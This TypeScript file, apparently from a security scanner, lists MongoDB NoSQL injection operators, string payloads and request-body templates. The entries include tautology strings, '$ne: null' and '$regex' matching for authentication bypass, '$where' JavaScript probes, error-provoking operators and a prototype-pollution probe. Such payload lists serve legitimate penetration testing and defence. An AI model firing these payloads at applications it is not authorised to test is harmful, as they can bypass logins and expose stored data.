// Common MongoDB NoSQL injection payloads and operators (safe-by-default strings)

export const operators: string[] = [
  "$ne",
  "$gt",
  "$lt",
  "$gte",
  "$lte",
  "$in",
  "$nin",
  "$regex",
  "$exists",
  "$type",
  "$or",
  "$and",
  "$not",
];

export const stringPayloads: string[] = [
  "' || 1==1 || '",
  '" || 1==1 || "',
  "' && this==this && '",
  '" && this==this && "',
  '{"$ne": null}',
  '{"$gt": ""}',
  '{"$regex": ".*"}',
  '{"$in": [""]}',
  // boolean-based
  '{"$where": "return true"}',
  '{"$where": "return false"}',
  // simple primitives for type juggling over query params
  "true",
  "false",
  "1",
  "0",
  // error-based (invalid operator name often triggers validation errors)
  '{"$abcd": 1}',
  '{"$where": 1}',
  '{"$or": 1}',
  '{"$regex": "["}',
  '{"$type": "notatype"}',
  // objectId/cast related
  'ObjectId("zzz")',
  '{"__proto__":{"polluted":"yes"}}',
];

export type BodyTemplate = (
  field: string,
  val: unknown
) => Record<string, unknown>;

export const bodyTemplates: BodyTemplate[] = [
  (field, val) => ({ [field]: { $ne: val } }),
  (field, _val) => ({ [field]: { $regex: ".*" } }),
  (field, val) => ({ [field]: { $in: [val, ""] } }),
  (field, _val) => ({ [field]: { $gt: "" } }),
  (field, val) => ({ $or: [{ [field]: val }, { [field]: { $ne: val } }] }),
  // boolean-based flips
  (field, _val) => ({ [field]: { $where: "return true" } }),
  (field, _val) => ({ [field]: { $where: "return false" } }),
  // error-based
  (field, _val) => ({ [field]: { $abcd: 1 } }),
  (field, _val) => ({ [field]: { $type: 2 } }),
  (field, _val) => ({ [field]: { $where: 1 } }),
  (field, _val) => ({ [field]: { $or: 1 } }),
  (field, _val) => ({ [field]: { $regex: "[" } }),
  (field, _val) => ({ [field]: { $type: "notatype" } }),
  // objectId/cast related in arrays
  (field, _val) => ({ [field]: { $in: [{ $oid: "zzz" }] } }),
  // type juggling: override type to boolean/number directly
  (field, _val) => ({ [field]: true as unknown as never }),
  (field, _val) => ({ [field]: false as unknown as never }),
  (field, _val) => ({ [field]: 1 as unknown as never }),
  (field, _val) => ({ [field]: 0 as unknown as never }),
  // validation/cast provocations for tests
  (field, _val) => ({ [field]: null as unknown as never }),
  (field, _val) => ({ [field]: "abc123" as unknown as never }),
];
